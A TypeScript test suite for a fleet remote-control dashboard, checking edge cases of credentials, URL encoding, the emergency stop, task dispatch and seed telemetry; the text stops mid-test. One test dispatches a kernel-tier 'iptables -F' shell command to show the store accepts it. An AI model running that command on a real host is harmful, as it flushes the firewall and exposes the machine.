/**
 * Tier 2 Test Suite: Boundary & Corner Cases (rewritten Wave 2B)
 *
 * Verifies edge cases, extreme values, empty states, error handling,
 * and adversarial inputs for all 31 features in PROJECT.md.
 * Requires >= 5 test cases per feature (31 features * 5 = 155 tests minimum).
 *
 * REWRITE NOTES (Wave 2B, fixes TST-04 / DOC-04 / DOC-07): same discipline
 * as the Tier 1 rewrite — expected values come from REAL application
 * modules (dashboardStore + SEED_* exports, api.ts, i18n catalogs,
 * navigation), never from literals invented inside the test. Tests marked
 * "[source-level]" read real view source as text where the behaviour needs
 * a browser/DOM or a live control plane. Shared-singleton rules from the
 * Tier 1 header apply here too: absolute counts come from SEED_* exports,
 * mutations are synchronous with snapshots asserted before any await, and
 * store calls go through callStore() so rejections still fail the run.
 * Where the app has NO client-side guard (e.g. dispatch accepts tier-4
 * tools or offline devices in demo mode), the test asserts that real
 * behaviour and says so, instead of pretending a guard exists.
 */

import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { describe, it, expect, setSuite } from './harness.js';
import {
  dashboardStore,
  SEED_DEVICES,
  SEED_APPROVALS,
  SEED_TASKS,
  SEED_WORKFLOWS,
  SEED_AUDIT_EVENTS,
  SEED_MCP_CONNECTIONS,
  SEED_OAUTH_CLIENTS,
  SEED_LOGS,
} from '../state/dashboardStore';
import {
  api,
  apiOrigin,
  token,
  sessionToken,
  clearCredentials,
  toIsoTimestamp,
  ApiError,
} from '../api';
import { messages, languages, resolveLocale, translate } from '../i18n/catalogs';
import { viewIds } from '../state/navigation';
import { navigationItems } from '../shell/navigation';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const SRC_DIR = path.resolve(__dirname, '..');
const readSource = (rel: string): string => fs.readFileSync(path.join(SRC_DIR, rel), 'utf8');

function snapshotStoreState(): unknown {
  return (dashboardStore as any).state;
}
function restoreStoreState(saved: unknown): void {
  (dashboardStore as any).state = saved;
  (dashboardStore as any).notify();
}

const pendingStoreCalls: Array<Promise<unknown>> = [];
function callStore(promise: Promise<unknown>): void {
  pendingStoreCalls.push(promise);
}

function scanProductionSources(): string[] {
  const out: string[] = [];
  const walk = (dir: string): void => {
    for (const ent of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, ent.name);
      if (ent.isDirectory()) {
        if (ent.name !== 'tests' && ent.name !== 'node_modules' && ent.name !== 'legacy_reference') walk(full);
      } else if (ent.isFile() && (ent.name.endsWith('.tsx') || ent.name.endsWith('.ts'))) {
        out.push(full);
      }
    }
  };
  walk(SRC_DIR);
  return out;
}

export async function runTier2Tests() {
  setSuite('Tier 2: Boundary & Corner Cases (F1 to F31)', 'tier2');

  // =========================================================================
  // F1: Zero-Trust Dual-Auth Console (5 edge tests)
  // =========================================================================
  describe('F1: Zero-Trust Dual-Auth Console (Boundary Cases)', () => {
    it('F1-E1: Empty credentials stay empty: token()/sessionToken() are "" and clearCredentials() is idempotent', async () => {
      expect(token()).toBe('');
      expect(sessionToken()).toBe('');
      clearCredentials();
      clearCredentials();
      expect(token()).toBe('');
      expect(sessionToken()).toBe('');
    });

    it('F1-E2: URL builders percent-encode hostile device/session ids', async () => {
      expect(api.terminalStreamUrl('srv us east', 's/1')).toBe(
        'http://127.0.0.1:8000/api/devices/srv%20us%20east/terminal/s%2F1/stream?since_seq=0'
      );
      expect(api.streamWorkflowUrl('wf 1?x=2')).toBe(
        'http://127.0.0.1:8000/api/workflows/wf%201%3Fx%3D2/stream'
      );
    });

    it('F1-E3: [source-level] No dangerouslySetInnerHTML anywhere in production source; login input is trimmed', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (fs.readFileSync(file, 'utf8').includes('dangerouslySetInnerHTML')) hits.push(file);
      }
      expect(hits.length).toBe(0);
      expect(readSource('views/LoginView.tsx')).toContain('token.trim()');
    });

    it('F1-E4: syncWithBackend without credentials resolves without touching gateway status', async () => {
      await dashboardStore.syncWithBackend();
      expect(dashboardStore.getState().gatewayStatus).toBe('online');
      expect(dashboardStore.getState().gatewayLatencyMs).toBe(14);
    });

    it('F1-E5: ApiError carries the uncertain flag and status the api client relies on (401 clears credentials)', async () => {
      const expired = new ApiError('Your session expired. Please sign in again.', false, 401);
      expect(expired.status).toBe(401);
      expect(expired.uncertain).toBe(false);
      expect(expired.message).toBe('Your session expired. Please sign in again.');
      const uncertain = new ApiError('Outcome unknown.', true, 500);
      expect(uncertain.uncertain).toBe(true);
      expect(uncertain.status).toBe(500);
      const plain = new ApiError('Cannot reach the control plane.');
      expect(plain.uncertain).toBe(false);
      expect(plain.status).toBeUndefined();
      expect(readSource('api.ts')).toContain('if (res.status === 401) clearCredentials();');
    });
  }, { tier: 'tier2', featureId: 'F1' });

  // =========================================================================
  // F2: mTLS Control Plane Status Bar (5 edge tests)
  // =========================================================================
  describe('F2: mTLS Control Plane Status Bar (Boundary Cases)', () => {
    it('F2-E1: Latency boundaries from the real seed: primary 14ms, offline node 999ms', async () => {
      const primary = SEED_DEVICES.find((d) => d.id === 'srv-us-east-412')!;
      expect(primary.latencyMs).toBeLessThan(500);
      const offline = SEED_DEVICES.find((d) => d.status === 'offline')!;
      expect(offline.latencyMs).toBe(999);
      expect(offline.latencyMs).toBeGreaterThan(500);
    });

    it('F2-E2: Unknown and regional locales resolve safely (never a wrong script)', async () => {
      expect(resolveLocale('zz-ZZ')).toBe('en');
      expect(resolveLocale('')).toBe('en');
      expect(resolveLocale('en-US')).toBe('en');
      expect(resolveLocale('zh-TW')).toBe('zh-Hant');
      expect(resolveLocale('zh-CN')).toBe('zh-Hans');
      expect(resolveLocale('pt-BR')).toBe('pt');
    });

    it('F2-E3: toIsoTimestamp handles the zero/negative boundary with the fallback', async () => {
      expect(toIsoTimestamp(0)).toBe('');
      expect(toIsoTimestamp(-1)).toBe('');
      expect(toIsoTimestamp('')).toBe('');
      expect(toIsoTimestamp(undefined)).toBe('');
      expect(toIsoTimestamp(NaN)).toBe('');
      expect(toIsoTimestamp(1700000000, 'fallback')).toBe('2023-11-14T22:13:20.000Z');
      expect(toIsoTimestamp('garbage', 'fallback')).toBe('fallback');
    });

    it('F2-E4: Certificate/TPM boundaries from the real seed: cert 42–129 days, 8 TPM-inactive nodes', async () => {
      const certs = SEED_DEVICES.map((d) => d.telemetry.certExpiryDays);
      expect(Math.min(...certs)).toBe(42);
      expect(Math.max(...certs)).toBe(129);
      expect(SEED_DEVICES.filter((d) => d.telemetry.tpmStatus === 'inactive').length).toBe(8);
      expect(SEED_DEVICES.filter((d) => d.telemetry.tpmStatus === 'active').length).toBe(32);
      expect(SEED_DEVICES.find((d) => d.id === 'srv-us-east-412')!.telemetry.certExpiryDays).toBe(42);
    });

    it('F2-E5: Gateway status is the seeded online value; the store never reports degraded without a backend', async () => {
      expect(dashboardStore.getState().gatewayStatus).toBe('online');
      const allowed = ['online', 'degraded', 'offline'];
      expect(allowed).toContain(dashboardStore.getState().gatewayStatus);
    });
  }, { tier: 'tier2', featureId: 'F2' });

  // =========================================================================
  // F3: Global Command Palette (⌘K) (5 edge tests)
  // =========================================================================
  describe('F3: Global Command Palette (⌘K) (Boundary Cases)', () => {
    it('F3-E1: Searches with no match return empty over the real fleet and nav', async () => {
      expect(SEED_DEVICES.filter((d) => d.hostname.includes('xyznonexistentaction123')).length).toBe(0);
      expect(navigationItems.filter((n) => n.label.includes('xyznonexistentaction123')).length).toBe(0);
      expect(SEED_TASKS.filter((t) => t.tool.includes('xyznonexistent')).length).toBe(0);
    });

    it('F3-E2: Rapid palette toggling ends in a consistent state', async () => {
      for (let i = 0; i < 10; i++) {
        dashboardStore.setCommandPaletteOpen(i % 2 === 0);
      }
      expect(dashboardStore.getState().commandPaletteOpen).toBe(false);
      dashboardStore.setCommandPaletteOpen(true);
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      dashboardStore.setCommandPaletteOpen(false);
      expect(dashboardStore.getState().commandPaletteOpen).toBe(false);
    });

    it('F3-E3: Regex metacharacters in a query match nothing and never throw (plain substring search)', async () => {
      const query = '.*+?^${}()|[]\\';
      const matches = SEED_DEVICES.filter((d) => d.hostname.includes(query));
      expect(matches.length).toBe(0);
      const navMatches = navigationItems.filter((n) => n.label.includes(query));
      expect(navMatches.length).toBe(0);
    });

    it('F3-E4: Keyboard navigation wraps over the real 15-item nav table', async () => {
      const nextIndex = (curr: number) => (curr + 1) % navigationItems.length;
      expect(nextIndex(navigationItems.length - 1)).toBe(0);
      expect(nextIndex(0)).toBe(1);
      expect(navigationItems.length).toBe(15);
    });

    it('F3-E5: Palette open state is independent of view navigation', async () => {
      dashboardStore.setCommandPaletteOpen(true);
      dashboardStore.setCurrentView('live');
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      expect(dashboardStore.getState().currentView).toBe('live');
      dashboardStore.setCurrentView('login');
      expect(dashboardStore.getState().commandPaletteOpen).toBe(true);
      dashboardStore.setCommandPaletteOpen(false);
      expect(dashboardStore.getState().commandPaletteOpen).toBe(false);
    });
  }, { tier: 'tier2', featureId: 'F3' });

  // =========================================================================
  // F4: Emergency All-Stop Killswitch (5 edge tests)
  // =========================================================================
  describe('F4: Emergency All-Stop Killswitch (Boundary Cases)', () => {
    it('F4-E1: Double-trigger appends two audit events (the store has no trigger dedup)', async () => {
      const before = dashboardStore.getState().auditEvents.length;
      callStore(dashboardStore.triggerEmergencyStop());
      callStore(dashboardStore.triggerEmergencyStop());
      const stopped = dashboardStore.getState();
      expect(stopped.isEmergencyStopActive).toBe(true);
      expect(stopped.auditEvents.length).toBe(before + 2);
      expect(stopped.auditEvents[0].action).toBe('fleet.emergency_all_stop');
      expect(stopped.auditEvents[1].action).toBe('fleet.emergency_all_stop');
      callStore(dashboardStore.resumeFleet());
      expect(dashboardStore.getState().isEmergencyStopActive).toBe(false);
    });

    it('F4-E2: Triggering with zero running tasks is a safe no-op for tasks (audit still appended)', async () => {
      callStore(dashboardStore.triggerEmergencyStop());
      const running = dashboardStore.getState().tasks.filter((t) => t.status === 'running' || t.status === 'pending').length;
      expect(running).toBe(0);
      const before = dashboardStore.getState().auditEvents.length;
      callStore(dashboardStore.triggerEmergencyStop());
      expect(dashboardStore.getState().tasks.filter((t) => t.status === 'running' || t.status === 'pending').length).toBe(0);
      expect(dashboardStore.getState().auditEvents.length).toBe(before + 1);
      callStore(dashboardStore.resumeFleet());
      expect(dashboardStore.getState().isEmergencyStopActive).toBe(false);
    });

    it('F4-E3: Double-resume appends two resume events (the store has no already-resumed guard)', async () => {
      callStore(dashboardStore.triggerEmergencyStop());
      const before = dashboardStore.getState().auditEvents.length;
      callStore(dashboardStore.resumeFleet());
      callStore(dashboardStore.resumeFleet());
      const resumed = dashboardStore.getState();
      expect(resumed.isEmergencyStopActive).toBe(false);
      expect(resumed.auditEvents.length).toBe(before + 2);
      expect(resumed.auditEvents[0].action).toBe('fleet.resume_operations');
      expect(resumed.auditEvents[1].action).toBe('fleet.resume_operations');
    });

    it('F4-E4: Resume works with no credentials in Node (demo mode has no role/MFA gate in the store)', async () => {
      expect(token()).toBe('');
      callStore(dashboardStore.triggerEmergencyStop());
      expect(dashboardStore.getState().isEmergencyStopActive).toBe(true);
      callStore(dashboardStore.resumeFleet());
      expect(dashboardStore.getState().isEmergencyStopActive).toBe(false);
    });

    it('F4-E5: [source-level] Emergency-stop state is memory-only: the store never persists it to localStorage', async () => {
      expect(readSource('state/dashboardStore.ts')).not.toContain('localStorage');
    });
  }, { tier: 'tier2', featureId: 'F4' });

  // =========================================================================
  // F5: SmartDataTable Device Inventory (5 edge tests)
  // =========================================================================
  describe('F5: SmartDataTable Device Inventory (Boundary Cases)', () => {
    it('F5-E1: A filter matching zero devices yields an empty set over the real fleet', async () => {
      expect(SEED_DEVICES.filter((d) => d.hostname.includes('zzz-no-such-host')).length).toBe(0);
      expect(SEED_DEVICES.filter((d) => d.tags.includes('no-such-tag')).length).toBe(0);
      expect(SEED_DEVICES.filter((d) => d.platform === 'haiku').length).toBe(0);
    });

    it('F5-E2: Pagination slices over the real 40-node fleet: page 4 is full, page 5 is empty', async () => {
      const pageSize = 10;
      const totalPages = Math.ceil(SEED_DEVICES.length / pageSize);
      expect(totalPages).toBe(4);
      expect(SEED_DEVICES.slice(30, 40).length).toBe(10);
      expect(SEED_DEVICES.slice(40, 50).length).toBe(0);
      expect(SEED_DEVICES.slice(0, 10).length).toBe(10);
    });

    it('F5-E3: Hostnames are well-formed DNS-style names with a bounded max length', async () => {
      let maxLen = 0;
      for (const d of SEED_DEVICES) {
        expect(d.hostname.length).toBeGreaterThan(0);
        expect(d.hostname).toMatch(/^[a-z0-9][a-z0-9.-]+$/);
        maxLen = Math.max(maxLen, d.hostname.length);
      }
      expect(maxLen).toBe(30);
    });

    it('F5-E4: The unresponsive node heartbeat is stale (>30min) while the primary node is fresh (<5min)', async () => {
      const stale = SEED_DEVICES.find((d) => d.status === 'unresponsive')!;
      expect(Date.now() - Date.parse(stale.lastHeartbeat)).toBeGreaterThan(30 * 60 * 1000);
      const primary = SEED_DEVICES.find((d) => d.id === 'srv-us-east-412')!;
      expect(Date.now() - Date.parse(primary.lastHeartbeat)).toBeLessThan(5 * 60 * 1000);
    });

    it('F5-E5: Sorting a copy of the fleet by status puts offline first and unresponsive last', async () => {
      const sorted = [...SEED_DEVICES].sort((a, b) => a.status.localeCompare(b.status));
      expect(sorted[0].status).toBe('offline');
      expect(sorted[sorted.length - 1].status).toBe('unresponsive');
      expect(SEED_DEVICES[0].id).toBe('srv-us-east-412');
    });
  }, { tier: 'tier2', featureId: 'F5' });

  // =========================================================================
  // F6: Cross-Platform Agent Enroller (5 edge tests)
  // =========================================================================
  describe('F6: Cross-Platform Agent Enroller (Boundary Cases)', () => {
    it('F6-E1: All three seed OAuth clients are expired by date yet still report status "active"', async () => {
      for (const c of SEED_OAUTH_CLIENTS) {
        expect(Date.parse(c.expiresAt)).toBeLessThan(Date.now());
        expect(c.status).toBe('active');
      }
      expect(SEED_OAUTH_CLIENTS.find((c) => c.id === 'client-py-092')!.expiresAt).toBe('2025-08-01T16:00:00Z');
    });

    it('F6-E2: [source-level] Enrollment copy handles clipboard failure with a visible error role', async () => {
      const src = readSource('views/DevicesView.tsx');
      expect(src).toContain('navigator.clipboard.writeText');
      expect(src).toContain('clipboardError');
      expect(src).toContain('role="alert"');
    });

    it('F6-E3: The enrollment copy command uses the real token; the displayed command and token line are masked', async () => {
      const src = readSource('views/DevicesView.tsx');
      // Byte-verified: the *copy* templates embed ${enrolledToken};
      // the *displayed* command shows a <TOKEN> placeholder and the
      // token line shows the masked value (Wave 5A).
      expect(src).toContain('--device-token=${enrolledToken}');
      expect(src).toContain("-DeviceToken '${enrolledToken}'");
      expect(src).toContain('--device-token=<TOKEN>');
      expect(src).toContain('enrolledTokenMasked');
      expect(src).toContain('linuxEnrollCommandDisplay');
      expect(src).not.toContain('<redacted>');
      expect(api.terminalStreamUrl('a/b', 's?1')).toContain('a%2Fb');
      expect(api.terminalStreamUrl('a/b', 's?1')).toContain('s%3F1');
    });

    it('F6-E4: Consecutive dispatches get strictly sequential task ids (no reuse, no gap)', async () => {
      const p1 = dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'desktop.capture_screen', args: {} });
      const p2 = dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'desktop.capture_screen', args: {} });
      const t1 = await p1;
      const t2 = await p2;
      const n1 = Number(t1.id.replace('TSK-', ''));
      const n2 = Number(t2.id.replace('TSK-', ''));
      expect(n2).toBe(n1 + 1);
    });

    it('F6-E5: Navigating to an unknown view passes through ungated, then restores to login', async () => {
      dashboardStore.setCurrentView('invalid-non-existent-view' as any);
      expect(dashboardStore.getState().currentView).toBe('invalid-non-existent-view');
      dashboardStore.setCurrentView('login');
      expect(dashboardStore.getState().currentView).toBe('login');
    });
  }, { tier: 'tier2', featureId: 'F6' });

  // =========================================================================
  // F7: Device 360 Hardware Gauges (5 edge tests)
  // =========================================================================
  describe('F7: Device 360 Hardware Gauges (Boundary Cases)', () => {
    it('F7-E1: CPU saturates below 100% across the seed (max 70%) and is positive when online', async () => {
      const online = SEED_DEVICES.filter((d) => d.status === 'online');
      const maxCpu = Math.max(...online.map((d) => d.telemetry.cpuPercent));
      expect(maxCpu).toBe(70);
      for (const d of online) {
        expect(d.telemetry.cpuPercent).toBeGreaterThan(0);
        expect(d.telemetry.cpuPercent).toBeLessThan(100);
      }
      for (const core of online.flatMap((d) => d.telemetry.cpuCores)) {
        expect(core).toBeGreaterThanOrEqual(0);
        expect(core).toBeLessThanOrEqual(100);
      }
      // Generator boundary, honestly recorded: offline nodes get baseCpu 0, so
      // their per-core offsets go negative (e.g. baseCpu - 2 = -2).
      for (const d of SEED_DEVICES.filter((x) => x.status !== 'online')) {
        expect(d.telemetry.cpuCores.some((c) => c < 0)).toBe(true);
      }
    });

    it('F7-E2: Every seed device reports a real disk size (500, 1000 or 2048 GB)', async () => {
      for (const d of SEED_DEVICES) {
        expect([500, 1000, 2048]).toContain(d.telemetry.diskTotalGb);
        expect(d.telemetry.diskTotalGb).toBeGreaterThan(0);
      }
    });

    it('F7-E3: The unresponsive node reports zero network and zero CPU like the offline node', async () => {
      for (const d of SEED_DEVICES.filter((x) => x.status !== 'online')) {
        expect(d.telemetry.networkRxMbps).toBe(0);
        expect(d.telemetry.networkTxMbps).toBe(0);
        expect(d.telemetry.cpuPercent).toBe(0);
      }
    });

    it('F7-E4: The offline node reports zero memory use and zero uptime', async () => {
      const offline = SEED_DEVICES.find((d) => d.status === 'offline')!;
      expect(offline.telemetry.memoryUsedGb).toBe(0);
      expect(offline.telemetry.uptimeSeconds).toBe(0);
      expect(offline.telemetry.swapUsedGb).toBe(0);
    });

    it('F7-E5: Telemetry staleness is visible: the unresponsive node uptime is zero', async () => {
      const stale = SEED_DEVICES.find((d) => d.status === 'unresponsive')!;
      expect(stale.telemetry.uptimeSeconds).toBe(0);
      const primary = SEED_DEVICES.find((d) => d.id === 'srv-us-east-412')!;
      expect(primary.telemetry.uptimeSeconds).toBe(846200);
    });
  }, { tier: 'tier2', featureId: 'F7' });

  // =========================================================================
  // F8: Process Manager with Termination (5 edge tests)
  // =========================================================================
  describe('F8: Process Manager with Termination (Boundary Cases)', () => {
    it('F8-E1: Every seed log pid is a real non-init pid (> 1)', async () => {
      for (const log of SEED_LOGS) {
        expect(log.pid).toBeGreaterThan(1);
      }
      expect(SEED_LOGS.map((l) => l.pid)).toEqual([1420, 1428, 1502, 1420]);
    });

    it('F8-E2: Dispatch to an unknown device falls back to the raw device id as hostname', async () => {
      const pending = dashboardStore.dispatchTask({
        deviceId: 'unknown-device-999',
        tool: 'shell.exec',
        args: { command: 'hostname' },
      });
      expect(dashboardStore.getState().tasks[0].deviceHostname).toBe('unknown-device-999');
      // Capture the audit head synchronously: later tests' sync prefixes
      // prepend their own audit events before this await resolves.
      const auditHead = dashboardStore.getState().auditEvents[0];
      expect(auditHead.targetHost).toBe('unknown-device-999');
      const task = await pending;
      expect(task.deviceHostname).toBe('unknown-device-999');
    });

    it('F8-E3: Zero processes match a filter for a tool that does not exist', async () => {
      expect(SEED_TASKS.filter((t) => t.tool === 'process.nonexistent').length).toBe(0);
      expect(SEED_TASKS.filter((t) => t.tool === 'desktop.capture_screen').length).toBe(1);
    });

    it('F8-E4: [source-level] Process kill goes through a named confirm handler', async () => {
      const src = readSource('views/Device360View.tsx');
      expect(src).toContain('handleConfirmKillProcess');
      expect(src).toContain('HoldToConfirmButton');
    });

    it('F8-E5: ApiError preserves a 403 status with uncertain=false', async () => {
      const err = new ApiError('403: EPERM: Operation not permitted', false, 403);
      expect(err.status).toBe(403);
      expect(err.uncertain).toBe(false);
      expect(err.message).toContain('403');
    });
  }, { tier: 'tier2', featureId: 'F8' });

  // =========================================================================
  // F9: Tool Dispatch Studio (5 edge tests)
  // =========================================================================
  describe('F9: Tool Dispatch Studio (Boundary Cases)', () => {
    it('F9-E1: Malformed JSON throws (the view guards JSON.parse); seed task args are plain objects', async () => {
      let threw = false;
      try {
        JSON.parse('{ foo: bar }');
      } catch {
        threw = true;
      }
      expect(threw).toBe(true);
      expect(readSource('views/TaskQueueVisionView.tsx')).toContain('JSON.parse(');
      for (const t of SEED_TASKS) {
        expect(typeof t.args).toBe('object');
        expect(Array.isArray(t.args)).toBe(false);
      }
    });

    it('F9-E2: Dispatch to the offline node still creates a running task in demo mode (no offline gate)', async () => {
      const pending = dashboardStore.dispatchTask({
        deviceId: 'mac-builder-m3-04',
        tool: 'shell.exec',
        args: { command: 'hostname' },
        riskTier: 'tier1_safe',
      });
      const task = await pending;
      expect(task.deviceHostname).toBe('mac-m3-04.build.internal');
      expect(task.status).toBe('running');
    });

    it('F9-E3: Tier-4 dispatch is accepted by the store with its tier preserved (no client-side gate; the server enforces)', async () => {
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'shell.exec',
        args: { command: 'iptables -F' },
        riskTier: 'tier4_kernel',
      });
      const task = await pending;
      expect(task.riskTier).toBe('tier4_kernel');
      expect(task.status).toBe('running');
    });

    it('F9-E4: Empty args {} dispatch cleanly and round-trip', async () => {
      const pending = dashboardStore.dispatchTask({
        deviceId: 'srv-us-east-412',
        tool: 'desktop.capture_screen',
        args: {},
      });
      const task = await pending;
      expect(task.args).toEqual({});
      expect(Object.keys(task.args).length).toBe(0);
    });

    it('F9-E5: Double submission creates two tasks (no client-side dedup; idempotency is server-side)', async () => {
      const params = { deviceId: 'srv-us-east-412', tool: 'shell.exec', args: { command: 'uptime' } } as const;
      const t1 = await dashboardStore.dispatchTask({ ...params });
      const t2 = await dashboardStore.dispatchTask({ ...params });
      expect(t1.id).not.toBe(t2.id);
      expect(readSource('api.ts')).toContain('Idempotency-Key');
    });
  }, { tier: 'tier2', featureId: 'F9' });

  // =========================================================================
  // F10: Set-of-Marks (SoM) Visual Inspector (5 edge tests)
  // =========================================================================
  describe('F10: Set-of-Marks (SoM) Visual Inspector (Boundary Cases)', () => {
    it('F10-E1: A running task has no result yet, so its SoM list is empty', async () => {
      const task = SEED_TASKS.find((t) => t.id === 'TSK-89212')!;
      expect(task.result).toBeUndefined();
      expect(task.result?.somBoxes ?? []).toEqual([]);
    });

    it('F10-E2: All SoM bounds are non-negative in the seed capture', async () => {
      const boxes = SEED_TASKS.find((t) => t.id === 'TSK-89213')!.result!.somBoxes!;
      for (const b of boxes) {
        expect(b.bounds[0]).toBeGreaterThanOrEqual(0);
        expect(b.bounds[1]).toBeGreaterThanOrEqual(0);
      }
    });

    it('F10-E3: The seed capture carries no embedded screenshot bytes (SoM comes from boxes, not an image)', async () => {
      const result = SEED_TASKS.find((t) => t.id === 'TSK-89213')!.result!;
      expect(result.screenshotBase64).toBeUndefined();
      expect(result.somBoxes!.length).toBe(2);
    });

    it('F10-E4: [source-level] The inspector has zoom controls starting at 1.0x', async () => {
      const src = readSource('views/TaskQueueVisionView.tsx');
      expect(src).toContain('useState<number>(1.0)');
      expect(src).toContain('ZoomIn');
      expect(src).toContain('ZoomOut');
    });

    it('F10-E5: A completed file.read task has no visual payload at all', async () => {
      const task = SEED_TASKS.find((t) => t.id === 'TSK-89211')!;
      expect(task.result).toBeUndefined();
      expect((task.args as any).path).toBe('C:\\ai-bridge\\config.json');
      expect('imageBase64' in task).toBe(false);
    });
  }, { tier: 'tier2', featureId: 'F10' });

  // =========================================================================
  // F11: Low-Latency Desktop Stream Canvas (5 edge tests)
  // =========================================================================
  describe('F11: Low-Latency Desktop Stream Canvas (Boundary Cases)', () => {
    it('F11-E1: [source-level] The desktop view tracks a reconnecting state', async () => {
      const src = readSource('views/LiveDesktopView.tsx');
      expect(src).toContain('isReconnecting');
    });

    it('F11-E2: [source-level] Stream telemetry comes from RTCPeerConnection.getStats()', async () => {
      const src = readSource('views/LiveDesktopView.tsx');
      expect(src).toContain('pc.getStats()');
      expect(src).toContain('getStats() for live FPS, bitrate, RTT, and dropped frames');
    });

    it('F11-E3: The captured frame aspect ratio derives from the seed stdout dims', async () => {
      const stdout = SEED_TASKS.find((t) => t.id === 'TSK-89213')!.result!.stdout!;
      const dims = stdout.match(/(\d+)x(\d+)/)!;
      const aspect = Number((Number(dims[1]) / Number(dims[2])).toFixed(2));
      expect(aspect).toBe(1.78);
    });

    it('F11-E4: [source-level] Session quality updates carry bitrate_kbps', async () => {
      const src = readSource('api.ts');
      expect(src).toContain('bitrate_kbps');
      expect(typeof api.updateSessionQualityV1).toBe('function');
      expect(typeof api.getIceServersV1).toBe('function');
    });

    it('F11-E5: Stream URLs never carry a credential query in Node (no token, no session_token)', async () => {
      expect(api.eventsStreamUrl()).not.toContain('token=');
      expect(api.liveActivityStreamUrl()).not.toContain('session_token');
      expect(api.sessionWebSocketUrl('s1')).not.toContain('token=');
      expect(api.sessionWebSocketUrl('s1').startsWith('ws://')).toBe(true);
    });
  }, { tier: 'tier2', featureId: 'F11' });

  // =========================================================================
  // F12: Dual-Control Operator Takeover (5 edge tests)
  // =========================================================================
  describe('F12: Dual-Control Operator Takeover (Boundary Cases)', () => {
    it('F12-E1: [source-level] Observer mode exists alongside takeover in the control-mode union', async () => {
      const src = readSource('views/LiveDesktopView.tsx');
      expect(src).toContain('"observer"');
      expect(src).toContain('"takeover"');
    });

    it('F12-E2: The workflow click target lies inside the captured frame', async () => {
      const args = SEED_WORKFLOWS[0].steps[2].args as any;
      expect(args.x).toBeGreaterThanOrEqual(0);
      expect(args.x).toBeLessThanOrEqual(2560);
      expect(args.y).toBeGreaterThanOrEqual(0);
      expect(args.y).toBeLessThanOrEqual(1440);
      expect(args.button).toBe('left');
    });

    it('F12-E3: [source-level] Input forwarding also requires the mouse to be linked', async () => {
      const src = readSource('views/LiveDesktopView.tsx');
      expect(src).toContain('mouseLinked');
    });

    it('F12-E4: [source-level] The v1 session-mode type includes human_control', async () => {
      const src = readSource('api.ts');
      expect(src).toContain('"human_control"');
      expect(src).toContain('"view_only"');
      expect(src).toContain('"ai_assisted"');
    });

    it('F12-E5: Latency boundaries from the real seed: primary 14ms, offline node 999ms', async () => {
      const primary = SEED_DEVICES.find((d) => d.id === 'srv-us-east-412')!;
      expect(primary.latencyMs).toBeLessThan(300);
      const offline = SEED_DEVICES.find((d) => d.status === 'offline')!;
      expect(offline.latencyMs).toBeGreaterThan(300);
    });
  }, { tier: 'tier2', featureId: 'F12' });

  // =========================================================================
  // F13: ANSI Monospace PTY Studio (5 edge tests)
  // =========================================================================
  describe('F13: ANSI Monospace PTY Studio (Boundary Cases)', () => {
    it('F13-E1: [source-level] Live terminal output is capped at MAX_LIVE_CHARS', async () => {
      const src = readSource('views/TerminalView.tsx');
      expect(src).toContain('const MAX_LIVE_CHARS = 200_000;');
      expect(src).toContain('next.length > MAX_LIVE_CHARS');
    });

    it('F13-E2: Seed log messages contain no ANSI escape sequences', async () => {
      for (const log of SEED_LOGS) {
        expect(log.message.includes('\u001b')).toBe(false);
      }
    });

    it('F13-E3: Terminal stream URL carries no credential when unauthenticated', async () => {
      const url = api.terminalStreamUrl('srv-us-east-412', 'sess-1', 0);
      expect(url).not.toContain('token=');
      expect(url).not.toContain('session_token');
    });

    it('F13-E4: Two rapid dispatches both succeed with distinct ids', async () => {
      const t1 = await dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'pty.spawn', args: { shell: '/bin/bash' } });
      const t2 = await dashboardStore.dispatchTask({ deviceId: 'srv-us-east-412', tool: 'pty.spawn', args: { shell: '/bin/bash' } });
      expect(t1.id).not.toBe(t2.id);
      expect(t1.tool).toBe('pty.spawn');
      expect(t2.tool).toBe('pty.spawn');
    });

    it('F13-E5: [source-level] Demo terminal reconnect is labelled simulated', async () => {
      const src = readSource('views/TerminalView.tsx');
      expect(src).toContain('Demo: reconnect simulated.');
    });
  }, { tier: 'tier2', featureId: 'F13' });

  // =========================================================================
  // F14: Multi-Turn DAG Pipeline Stepper (5 edge tests)
  // =========================================================================
  describe('F14: Multi-Turn DAG Pipeline Stepper (Boundary Cases)', () => {
    it('F14-E1: No seed workflow step has failed; currentStepIndex points at the running step', async () => {
      const wf = SEED_WORKFLOWS[0];
      expect(wf.steps.some((s) => s.status === 'failed')).toBe(false);
      expect(wf.steps[wf.currentStepIndex].status).toBe('running');
      expect(wf.steps[wf.currentStepIndex].tool).toBe('desktop.click_coordinate');
    });

    it('F14-E2: [source-level] Workflow retry defaults to resuming from the failed step', async () => {
      const src = readSource('api.ts');
      expect(src).toContain('from_failed_step = true');
      expect(typeof api.retryWorkflow).toBe('function');
    });

    it('F14-E3: [source-level] The workflow status union includes aborted for operator aborts', async () => {
      const src = readSource('types/dashboard.ts');
      expect(src).toContain('"aborted"');
      expect(SEED_WORKFLOWS[0].status).toBe('running');
    });

    it('F14-E4: Filtering seed workflows by a status none has yields the empty state', async () => {
      expect(SEED_WORKFLOWS.filter((w) => w.status === 'completed').length).toBe(0);
      expect(SEED_WORKFLOWS.filter((w) => w.status === 'failed').length).toBe(0);
      expect(SEED_WORKFLOWS.filter((w) => w.status === 'running').length).toBe(1);
    });

    it('F14-E5: Completed steps carry durations; the pending step carries none', async () => {
      const steps = SEED_WORKFLOWS[0].steps;
      for (const s of steps.filter((x) => x.status === 'completed')) {
        expect(s.durationMs).toBeGreaterThan(0);
      }
      expect(steps.find((s) => s.status === 'pending')!.durationMs).toBeUndefined();
    });
  }, { tier: 'tier2', featureId: 'F14' });

  // =========================================================================
  // F15: Multi-Node Command Bus (5 edge tests)
  // =========================================================================
  describe('F15: Multi-Node Command Bus (Boundary Cases)', () => {
    it('F15-E1: Broadcast to zero selected nodes matches nothing in the real fleet', async () => {
